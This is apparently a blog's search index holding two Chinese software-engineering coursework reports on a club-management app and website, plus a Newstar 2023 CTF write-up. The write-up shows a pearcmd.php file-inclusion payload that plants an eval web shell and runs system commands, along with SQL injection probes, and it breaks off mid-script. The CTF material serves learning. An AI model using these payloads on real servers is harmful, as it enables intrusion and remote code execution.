<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>软件工程第二组(Demo)初成果演示</title>
    <link href="/2023/12/04/2023-12-4-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E9%87%8C%E7%A8%8B%E7%A2%913/"/>
    <url>/2023/12/04/2023-12-4-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E9%87%8C%E7%A8%8B%E7%A2%913/</url>
    
    <content type="html"><![CDATA[<h1 id="软件工程第二组-Demo-初成果演示"><a href="#软件工程第二组-Demo-初成果演示" class="headerlink" title="软件工程第二组(Demo)初成果演示"></a>软件工程第二组(Demo)初成果演示</h1><h2 id="分工"><a href="#分工" class="headerlink" title="分工:"></a>分工:</h2><p>高铮男:网页端制作</p><p>胡纪福:APP端制作</p><p>陈帅:网页端制作</p><p>韩汝代:类图，用例图</p><p>周诗乔:数据流图</p><p>竺柯杰:顺序图</p><h2 id="iClub项目背景及简介"><a href="#iClub项目背景及简介" class="headerlink" title="iClub项目背景及简介"></a>iClub项目背景及简介</h2><p>大学里有各种各样的社团，但是没有一个集中的平台综合管理这些社团信息，因此学生也很难全面了解到学校的社团以及社团活动。因此本项目面向对象为大学全体学生，实现校园社团管理功能，例如检索校内所有社团、申请加入，参加社团活动等。</p><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析:"></a>需求分析:</h2><h3 id="非社长学生"><a href="#非社长学生" class="headerlink" title="非社长学生"></a>非社长学生</h3><p>1.校内所有学生账号密码已根据学号初始化，无需注册，直接登录。</p><p>2.非社长学生可以修改自己的基本信息（密码、昵称、手机号、头像等等信息）。</p><p>3.非社长学生可以查询所有社团的基本信息、已经加入的社团。</p><p>4.非社长学生可以填写社团申请表，社长审核通过后可成为社员。</p><p>5.非社长学生可以查询所有社团发布的活动、已经报名的活动，报名符合条件的活动。</p><p>6.非社长学生可以接收相关活动、社团的通知。</p><p>7.非社长学生可以在留言板留言并查看留言板所有内容、我的留言以及评论。</p><h3 id="社长学生"><a href="#社长学生" class="headerlink" title="社长学生"></a>社长学生</h3><p>1.社长学生是特殊的普通学生，拥有普通学生的所有功能。</p><p>2.社团、社长信息由后台管理员管理。</p><p>3.社长可以修改本社团基本信息（名称、Logo、社团简介等）。</p><p>4.社长可以管理本社团活动（发布活动、修改活动信息、删除活动）。</p><p>5.社长可以管理本社团社员（审核入社申请、删除社员、查看社员信息）。</p><p>6.社长可以管理本社团通知（发布通知，删除通知）。</p><p>7.社长可以将社长职位转让给某社员。</p><h3 id="后台管理员"><a href="#后台管理员" class="headerlink" title="后台管理员"></a>后台管理员</h3><ol><li>后台管理员进行学生、社团的增、删。</li><li>后台管理员审批社长发布的活动是否通过。</li><li>后台管理员可以修改社长、社团信息（对数据库进行直接操作）。</li></ol><h2 id="用例图"><a href="#用例图" class="headerlink" title="用例图:"></a>用例图:</h2><p>根据软件需求和原型图制作绘制了以下用例图（为了更加清晰展示将软件的三个主体功能分为三个系统绘制）：</p><p><img src="/images/2023_12_4_third_milestone/%E7%94%A8%E4%BE%8B%E5%9B%BE%EF%BC%88%E6%8B%BC%E6%8E%A5%EF%BC%89.jpg" alt="用例图（拼接）"></p><h2 id="类图"><a href="#类图" class="headerlink" title="类图:"></a>类图:</h2><p><img src="/images/2023_12_4_third_milestone/%E7%B1%BB%E5%9B%BE.png" alt="类图"></p><h2 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图:"></a>数据流图:</h2><p><img src="/images/2023_12_4_third_milestone/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE.png" alt="数据流图"></p><h2 id="顺序图"><a href="#顺序图" class="headerlink" title="顺序图:"></a>顺序图:</h2><h3 id="报名活动"><a href="#报名活动" class="headerlink" title="报名活动:"></a>报名活动:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%8A%A5%E5%90%8D%E6%B4%BB%E5%8A%A8.png" alt="顺序图_报名活动"></p><h3 id="查看所有活动"><a href="#查看所有活动" class="headerlink" title="查看所有活动:"></a>查看所有活动:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E6%B4%BB%E5%8A%A8.png" alt="顺序图_查看所有活动"></p><h3 id="查看所有社团"><a href="#查看所有社团" class="headerlink" title="查看所有社团:"></a>查看所有社团:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%A4%BE%E5%9B%A2.png" alt="顺序图_查看所有社团"></p><h3 id="查看已经报名的活动"><a href="#查看已经报名的活动" class="headerlink" title="查看已经报名的活动:"></a>查看已经报名的活动:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E6%9F%A5%E7%9C%8B%E5%B7%B2%E6%8A%A5%E5%90%8D%E7%9A%84%E6%B4%BB%E5%8A%A8.png" alt="顺序图_查看已报名的活动"></p><h3 id="加入社团"><a href="#加入社团" class="headerlink" title="加入社团:"></a>加入社团:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E5%8A%A0%E5%85%A5%E7%A4%BE%E5%9B%A2.png" alt="顺序图_加入社团"></p><h3 id="社长创建活动"><a href="#社长创建活动" class="headerlink" title="社长创建活动:"></a>社长创建活动:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E7%A4%BE%E9%95%BF%E5%88%9B%E5%BB%BA%E6%B4%BB%E5%8A%A8.png" alt="顺序图_社长创建活动"></p><h3 id="社长转让"><a href="#社长转让" class="headerlink" title="社长转让:"></a>社长转让:</h3><p><img src="/images/2023_12_4_third_milestone/%E9%A1%BA%E5%BA%8F%E5%9B%BE_%E7%A4%BE%E9%95%BF%E8%BD%AC%E8%AE%A9.png" alt="顺序图_社长转让"></p><h2 id="APP端"><a href="#APP端" class="headerlink" title="APP端:"></a>APP端:</h2><p><img src="/images/2023_12_4_third_milestone/4f4b69ccef768c2f838880d3d7a8543.jpg" alt="4f4b69ccef768c2f838880d3d7a8543"></p><p><img src="/images/2023_12_4_third_milestone/5d4d03b8a7958ea1f3cb97980113db1.jpg" alt="5d4d03b8a7958ea1f3cb97980113db1"></p><p><img src="/images/2023_12_4_third_milestone/9fb199579e2f6aa550e4f8f66d06138.jpg" alt="9fb199579e2f6aa550e4f8f66d06138"></p><p><img src="/images/2023_12_4_third_milestone/2ebb597136e7ab2c88d2fc1103d2cad.jpg" alt="2ebb597136e7ab2c88d2fc1103d2cad"></p><p><img src="/images/2023_12_4_third_milestone/bbcebd8ab4eaea7360b797f9be0af4a.jpg" alt="bbcebd8ab4eaea7360b797f9be0af4a"></p><h2 id="网页端"><a href="#网页端" class="headerlink" title="网页端:"></a>网页端:</h2><p>网页端根据ui设计的基础，进行改善从而完成首页，协会成员和联系的界面:</p><h3 id="首页"><a href="#首页" class="headerlink" title="首页:"></a>首页:</h3><p><img src="/images/2023_12_4_third_milestone/image-20231203205816231.png" alt="image-20231203205816231"></p><p><img src="/images/2023_12_4_third_milestone/image-20231203205906126.png" alt="image-20231203205906126"></p><p><img src="/images/2023_12_4_third_milestone/image-20231203205939250.png" alt="image-20231203205939250"></p><p><img src="/images/2023_12_4_third_milestone/image-20231203210003859.png" alt="image-20231203210003859"></p><h3 id="协会成员"><a href="#协会成员" class="headerlink" title="协会成员:"></a>协会成员:</h3><p><img src="/images/2023_12_4_third_milestone/image-20231203210137947.png" alt="image-20231203210137947"></p><h3 id="联系"><a href="#联系" class="headerlink" title="联系:"></a>联系:</h3><p><img src="/images/2023_12_4_third_milestone/image-20231203210236649.png" alt="image-20231203210236649"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>软件工程第二组用例图，类图，流程图，顺序图分析设计报告</title>
    <link href="/2023/11/20/2023-11-20-second_milestone/"/>
    <url>/2023/11/20/2023-11-20-second_milestone/</url>
    
    <content type="html"><![CDATA[<h1 id="软件工程第二组用例图，类图，流程图，顺序图分析设计报告"><a href="#软件工程第二组用例图，类图，流程图，顺序图分析设计报告" class="headerlink" title="软件工程第二组用例图，类图，流程图，顺序图分析设计报告"></a>软件工程第二组用例图，类图，流程图，顺序图分析设计报告</h1><h2 id="分工"><a href="#分工" class="headerlink" title="分工:"></a>分工:</h2><p>高铮男:网页类图和用例图</p><p>胡纪福:APP类图和用例图</p><p>陈帅:网页系统的数据流图</p><p>周诗乔:APP系统的数据流图</p><p>韩汝代:APP用例的顺序图</p><p>竺柯杰:网页用例的顺序图</p><h2 id="网络空间安全社团网页"><a href="#网络空间安全社团网页" class="headerlink" title="网络空间安全社团网页:"></a>网络空间安全社团网页:</h2><h3 id="用例图："><a href="#用例图：" class="headerlink" title="用例图："></a>用例图：</h3><p>根据网络空间安全社团的ui设计界面对用例图进行分析设计。</p><h4 id="首页："><a href="#首页：" class="headerlink" title="首页："></a>首页：</h4><p>首页ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118162312165.png" alt="image-20231118162312165"></p><p>首页的面向社员和管理员，两类人员，社员只拥有对首页的观阅功能，管理员拥有观阅功能和对首页内容修改的功能:</p><h5 id="首页用例图"><a href="#首页用例图" class="headerlink" title="首页用例图:"></a>首页用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120103811018.png" alt="image-20231120103811018"></p><h4 id="社团介绍页面"><a href="#社团介绍页面" class="headerlink" title="社团介绍页面:"></a>社团介绍页面:</h4><p>社团介绍页面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118162800500.png" alt="image-20231118162800500"></p><p>社团介绍页面面向社员和管理员，两类人员，社员只拥有对社团信息、奖项、人员信息和合照的观阅功能，管理员额外拥有对当前页面的信息修改功能。</p><h5 id="社团介绍界面用例图"><a href="#社团介绍界面用例图" class="headerlink" title="社团介绍界面用例图:"></a>社团介绍界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120103958045.png" alt="image-20231120103958045"></p><h4 id="社团公告界面："><a href="#社团公告界面：" class="headerlink" title="社团公告界面："></a>社团公告界面：</h4><p>社团公告界面ui：<br><img src="/images/2023_11_20_second_milestone/image-20231118163635092.png" alt="image-20231118163635092"></p><p>社团介绍页面面向社员和管理员，两类人员，社员只拥有对网页中公告的查阅功能，管理员拥有额外对公告删除和发布的公告处理功能</p><h5 id="社团公告界面用例图"><a href="#社团公告界面用例图" class="headerlink" title="社团公告界面用例图:"></a>社团公告界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120104419813.png" alt="image-20231120104419813"></p><h4 id="竞赛中心界面"><a href="#竞赛中心界面" class="headerlink" title="竞赛中心界面:"></a>竞赛中心界面:</h4><p>竞赛中心界面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118164809014.png" alt="image-20231118164809014"></p><p>社团介绍页面面向社员和管理员，两类人员,社员可以查阅公开赛、内部赛的信息和自己已经报名的竞赛信息，管理员拥有对公开赛和内部赛的查阅功能，以及删除竞赛活动和发布竞赛活动的活动处理功能:</p><h5 id="竞赛中心界面用例图"><a href="#竞赛中心界面用例图" class="headerlink" title="竞赛中心界面用例图:"></a>竞赛中心界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120104605766.png" alt="image-20231120104605766"></p><h4 id="链接界面"><a href="#链接界面" class="headerlink" title="链接界面:"></a>链接界面:</h4><p>链接界面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118183712830.png" alt="image-20231118183712830"></p><p>社团介绍页面面向社员和管理员，两类人员,社员只有对博客链接、资源和联系我们的查阅功能，管理员拥有对博客链接信息，资源信息，联系我们的信息的处理功能</p><h5 id="链接界面用例图"><a href="#链接界面用例图" class="headerlink" title="链接界面用例图:"></a>链接界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231120104753303.png" alt="image-20231120104753303"></p><h4 id="练习场界面"><a href="#练习场界面" class="headerlink" title="练习场界面:"></a>练习场界面:</h4><p>练习场界面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118185058785.png" alt="image-20231118185058785"></p><p>社团介绍页面面向社员和管理员，两类人员,社员拥有对各类题型题目的查阅功能，对题目的打开和测试，以及对指定题目的搜索功能，管理员拥有额外对题目的发布和删除功能</p><h5 id="练习场界面用例图"><a href="#练习场界面用例图" class="headerlink" title="练习场界面用例图:"></a>练习场界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118193056383.png" alt="image-20231118193056383"></p><h4 id="个人中心界面"><a href="#个人中心界面" class="headerlink" title="个人中心界面:"></a>个人中心界面:</h4><p>个人中心界面ui:<br><img src="/images/2023_11_20_second_milestone/image-20231118193527654.png" alt="image-20231118193527654"></p><p>个人中心的操作界面，只面向社员，社员拥有对该界面的查阅和编辑个人信息的功能</p><h5 id="个人信息界面用例图"><a href="#个人信息界面用例图" class="headerlink" title="个人信息界面用例图:"></a>个人信息界面用例图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118195032429.png" alt="image-20231118195032429"></p><h3 id="类图"><a href="#类图" class="headerlink" title="类图:"></a>类图:</h3><h5 id="首页类图"><a href="#首页类图" class="headerlink" title="首页类图:"></a>首页类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118212000182.png" alt="image-20231118212000182"></p><h5 id="社团介绍页面类图"><a href="#社团介绍页面类图" class="headerlink" title="社团介绍页面类图:"></a>社团介绍页面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118225249988.png" alt="image-20231118225249988"></p><h5 id="社团公告界面类图"><a href="#社团公告界面类图" class="headerlink" title="社团公告界面类图:"></a>社团公告界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231118231142322.png" alt="image-20231118231142322"></p><h5 id="竞赛中心界面类图"><a href="#竞赛中心界面类图" class="headerlink" title="竞赛中心界面类图:"></a>竞赛中心界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119012614739.png" alt="image-20231119012614739"></p><h5 id="链接界面类图"><a href="#链接界面类图" class="headerlink" title="链接界面类图:"></a>链接界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119013509291.png" alt="image-20231119013509291"></p><h5 id="练习场界面类图"><a href="#练习场界面类图" class="headerlink" title="练习场界面类图:"></a>练习场界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119130001581.png" alt="image-20231119130001581"></p><h5 id="个人中心界面类图"><a href="#个人中心界面类图" class="headerlink" title="个人中心界面类图:"></a>个人中心界面类图:</h5><p><img src="/images/2023_11_20_second_milestone/image-20231119131536125.png" alt="image-20231119131536125"></p><h3 id="网页的数据流图"><a href="#网页的数据流图" class="headerlink" title="网页的数据流图:"></a>网页的数据流图:</h3><h5 id="Goose网站数据流程图"><a href="#Goose网站数据流程图" class="headerlink" title="Goose网站数据流程图:"></a>Goose网站数据流程图:</h5><p><img src="/images/2023_11_20_second_milestone/wps1-1700442602419-1.jpg" alt="img"> </p><p>题库信息管理：</p><p>管理员发出对应的题目信息进入题库，社员可以拉取对应的题目，然后完成后可以填写答案，系统判断答案对错，将对应的判断信息返回</p><p>网页公告管理：</p><p>社团会发布各种各样的公告，管理员将对应的公告信息发布，以便社员能浏览</p><p>竞赛信息管理：</p><p>社团举办网络安全赛事，管理员将赛事信息录入，录入后社员可以根据自己的需求报名，报名信息进入竞赛报名审批表，管理员进行审批，审批后将对应的审批信息发送给社员</p><p>个人信息管理：</p><p>社员可以管理自己个人信息，同时其它社员也可以访问社员空间，查看能展示的个人信息</p><p>社团信息管理：</p><p>管理员发布社团信息，诸如社团获奖情况，社团近照，社员可以查看</p><h3 id="网页用例的顺序图"><a href="#网页用例的顺序图" class="headerlink" title="网页用例的顺序图:"></a>网页用例的顺序图:</h3><h5 id="个人中中心信息修改："><a href="#个人中中心信息修改：" class="headerlink" title="个人中中心信息修改："></a>个人中中心信息修改：</h5><p><img src="/images/2023_11_20_second_milestone/wps2-1700442695271-5.jpg" alt="img"> </p><p>社员在个人信息页面，通过修改姓名方法去修改信息，通过获取姓名方法获得新的姓名</p><h5 id="公开赛活动删除："><a href="#公开赛活动删除：" class="headerlink" title="公开赛活动删除："></a>公开赛活动删除：</h5><p><img src="/images/2023_11_20_second_milestone/wps3-1700442695271-6.jpg" alt="img"> </p><p>管理员进入竞赛中心页面，通过修改公开赛活动进入公开赛页面，通过修改当前页面活动进入公开赛活动合集，修改活动内容。通过获取活动内容、获取当前页面活动、获取公开赛活动获得新的活动信息。</p><h5 id="更改公告标题："><a href="#更改公告标题：" class="headerlink" title="更改公告标题："></a>更改公告标题：</h5><p><img src="/images/2023_11_20_second_milestone/wps4-1700442695270-4.jpg" alt="img"> </p><p>管理员进入社团公告页面，通过修改公告标题方法更改公告标题，通过获取公告标题方法获取新的社团公告标题，再通过获取当前页面公告方法获取新信息</p><h5 id="社团介绍信息修改："><a href="#社团介绍信息修改：" class="headerlink" title="社团介绍信息修改："></a>社团介绍信息修改：</h5><p><img src="/images/2023_11_20_second_milestone/wps5-1700442695270-3.jpg" alt="img"> </p><p>管理员进入社团介绍页面，通过修改社团干部信息方法进入人员信息页面，通过修改姓名方法修改干部姓名，再通过获取姓名、获取社团干部信息、获取页面名称获取新信息</p><h5 id="练习场题目上传："><a href="#练习场题目上传：" class="headerlink" title="练习场题目上传："></a>练习场题目上传：</h5><p><img src="/images/2023_11_20_second_milestone/wps6-1700442695271-7.jpg" alt="img"> </p><p>管理员打开练习场页面，查看题目列表，通过上床题目将题目上传数据库，在练习场页面获取新的题目列表。</p><h2 id="社团管理APP-iClub"><a href="#社团管理APP-iClub" class="headerlink" title="社团管理APP(iClub):"></a>社团管理APP(iClub):</h2><h3 id="iClub项目背景及简介"><a href="#iClub项目背景及简介" class="headerlink" title="iClub项目背景及简介:"></a>iClub项目背景及简介:</h3><p>大学里有各种各样的社团，但是没有一个集中的平台综合管理这些社团信息，因此学生也很难全面了解到学校的社团以及社团活动。因此本项目面向对象为大学全体学生，实现校园社团管理功能，例如检索校内所有社团、申请加入，参加社团活动等。</p><h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析:"></a>需求分析:</h3><h4 id="非社长学生"><a href="#非社长学生" class="headerlink" title="非社长学生:"></a>非社长学生:</h4><p>1.校内所有学生账号密码已根据学号初始化，无需注册，直接登录。</p><p>2.非社长学生可以修改自己的基本信息（密码、昵称、手机号、头像等等信息）。</p><p>3.非社长学生可以查询所有社团的基本信息、已经加入的社团。</p><p>4.非社长学生可以填写社团申请表，社长审核通过后可成为社员。</p><p>5.非社长学生可以查询所有社团发布的活动、已经报名的活动，报名符合条件的活动。</p><p>6.非社长学生可以接收相关活动、社团的通知。</p><p>7.非社长学生可以在留言板留言并查看留言板所有内容、我的留言以及评论。</p><h4 id="社长学生"><a href="#社长学生" class="headerlink" title="社长学生:"></a>社长学生:</h4><p>1.社长学生是特殊的普通学生，拥有普通学生的所有功能。</p><p>2.社团、社长信息由后台管理员管理。</p><p>3.社长可以修改本社团基本信息（名称、Logo、社团简介等）。</p><p>4.社长可以管理本社团活动（发布活动、修改活动信息、删除活动）。</p><p>5.社长可以管理本社团社员（审核入社申请、删除社员、查看社员信息）。</p><p>6.社长可以管理本社团通知（发布通知，删除通知）。</p><p>7.社长可以将社长职位转让给某社员。</p><h4 id="后台管理员"><a href="#后台管理员" class="headerlink" title="后台管理员:"></a>后台管理员:</h4><ol><li>后台管理员进行学生、社团的增、删。</li><li>后台管理员审批社长发布的活动是否通过。</li><li>后台管理员可以修改社长、社团信息（对数据库进行直接操作）。</li></ol><h3 id="用例图"><a href="#用例图" class="headerlink" title="用例图:"></a>用例图:</h3><p>根据软件需求和原型图制作绘制了以下用例图（为了更加清晰展示将软件的三个主体功能分为三个系统绘制）：</p><h4 id="社团管理用例"><a href="#社团管理用例" class="headerlink" title="社团管理用例:"></a>社团管理用例:</h4><p><img src="/images/2023_11_20_second_milestone/wps7.jpg" alt="img"> </p><h4 id="活动管理用例"><a href="#活动管理用例" class="headerlink" title="活动管理用例:"></a>活动管理用例:</h4><p><img src="/images/2023_11_20_second_milestone/wps8.jpg" alt="img"> </p><h4 id="用户资料用例"><a href="#用户资料用例" class="headerlink" title="用户资料用例:"></a>用户资料用例:</h4><p><img src="/images/2023_11_20_second_milestone/wps9.jpg" alt="img"> </p><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图:"></a>类图:</h3><p><img src="/images/2023_11_20_second_milestone/wps10.jpg" alt="img"> </p><h3 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图:"></a>数据流图:</h3><p><img src="/images/2023_11_20_second_milestone/wps1.png" alt="img"></p><p>初始社团信息由后台管理员提供</p><p>所有学生初始化个人信息由后台管理员初始化</p><p>社长拥有普通学生的所有的功能，非社长登陆之后没有社团管理功能，所有人可发布和查看帖子、评论</p><h3 id="APP用例顺序图"><a href="#APP用例顺序图" class="headerlink" title="APP用例顺序图:"></a>APP用例顺序图:</h3><p>普通学生通过永和信息修改页面输入新修改的信息再通过用户id查询用户表并对用户表进行修改</p><p><img src="/images/2023_11_20_second_milestone/wps2-1700443236234-18.jpg" alt="img"> </p><p>社长通过永和信息修改页面输入新修改的信息再通过用户id查询用户表并对用户表进行修改</p><p><img src="/images/2023_11_20_second_milestone/wps3-1700443236234-19.jpg" alt="img"> </p><p>普通学生通过加入社团页面加入社团，获取社团与用户id并通过其修改社团表和用户表完成加入社团这一行为</p><p><img src="/images/2023_11_20_second_milestone/wps4-1700443236234-20.jpg" alt="img"> </p><p>普通学生通过加入的社团查看页面查看加入社团，通过加入社团的id查询社团表并返回查询信息</p><p><img src="/images/2023_11_20_second_milestone/wps5-1700443236234-21.jpg" alt="img"> </p><p>普通学生通过社团查看页面查看社团，通过筛选条件与搜索关键词查询社团表并返回查询信息</p><p><img src="/images/2023_11_20_second_milestone/wps6-1700443236234-22.jpg" alt="img"> </p><p>社长通过查看管理的社团页面查看所管理社团，通过用户id查询用户表后通过返回表获取其所管理的社团id，之后在用其查询社团表活动所管理社团的信息</p><p><img src="/images/2023_11_20_second_milestone/wps7-1700443236234-23.jpg" alt="img"> </p><p>社长通过社长转让页面转让社长，获取用户与社团的id后使用其修改社团表和用户表的的信息完成社长转让</p><p><img src="/images/2023_11_20_second_milestone/wps8-1700443236235-24.jpg" alt="img"> </p><p>普通学生通过活动报名页面报名活动，通过获取的用户与活动id查询活动表和用户表修改其信息完成报名活动</p><p><img src="/images/2023_11_20_second_milestone/wps9-1700443236235-25.jpg" alt="img"> </p><p>普通学生通过活动查看页面查看活动，通过筛选条件与搜索关键词查询活动表并返回查询信息</p><p><img src="/images/2023_11_20_second_milestone/wps10-1700443236235-26.jpg" alt="img"> </p><p>普通学生通过活动报名查看页面查看报名的活动，通过报名活动的id查询社团表并返回查询信息</p><p><img src="/images/2023_11_20_second_milestone/wps11.jpg" alt="img"> </p><p>社长通过活动创建页面创建活动，社长输入活动信息后通过其信息修改活动表完成创建活动</p><p><img src="/images/2023_11_20_second_milestone/wps12.jpg" alt="img"> </p><p>社长通过活动报名信息查询界面查询活动报名信息，首先获取其所管理的社团id，并通过其喜欢寻社团表，通过其返回表的信息获取活动id，并利用其查询活动报名表，并返回活动信息</p><p><img src="/images/2023_11_20_second_milestone/wps13.jpg" alt="img"> </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Newstar新生赛2023第三周WP</title>
    <link href="/2023/11/03/2023-11-3-newstarweek3/"/>
    <url>/2023/11/03/2023-11-3-newstarweek3/</url>
    
    <content type="html"><![CDATA[<h1 id="Newstar新生赛2023第三周WP"><a href="#Newstar新生赛2023第三周WP" class="headerlink" title="Newstar新生赛2023第三周WP"></a>Newstar新生赛2023第三周WP</h1><h2 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-comment">//将文件包含漏洞的伪协议ban掉了</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">//提示phpinfo.php文件</span><br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>访问phpinfo.php,并在响应内容中寻找flag：<br><img src="/images/2023-11-3-newstar-3/image-20231009114740035.png" alt="image-20231009114740035"></p><p>寻找一下register_argc_argv：</p><p><img src="/images/2023-11-3-newstar-3/image-20231009114850048.png" alt="image-20231009114850048"></p><p>发现register_argc_argv处于开启状态,所以可以[利用pearcmd.php本地文件包含（LFI):<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p>使用bp上传payload,直接用浏览器上传会导致我们传入的内容被url编码化，导致php语言变形</p><p><img src="/images/2023-11-3-newstar-3/image-20231009115202206.png" alt="image-20231009115202206"></p><p>我们的文件被成功创建在&#x2F;tmp目录下,为test.php</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">?file=/tmp/test.php<br>=&gt;由于后面它给我们自动加上php,所以我们只需要传入文件名即可<br>?file=/tmp/test<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115338558.png" alt="image-20231009115338558"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;ls /&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115429049.png" alt="image-20231009115429049"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>cmd=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231009115526916.png" alt="image-20231009115526916"></p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27; GROUP BY 5 -- &#x27;<br></code></pre></td></tr></table></figure><p>得到字段数量为5</p><p>使用盲注：<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=1) -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010205748567.png" alt="image-20231010205748567"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=TMP0919&#x27;anD(1=2) -- &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-11-3-newstar-3/image-20231010215505760.png" alt="image-20231010215505760"></p><p>存在sql注入盲注点</p><p>爆表:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 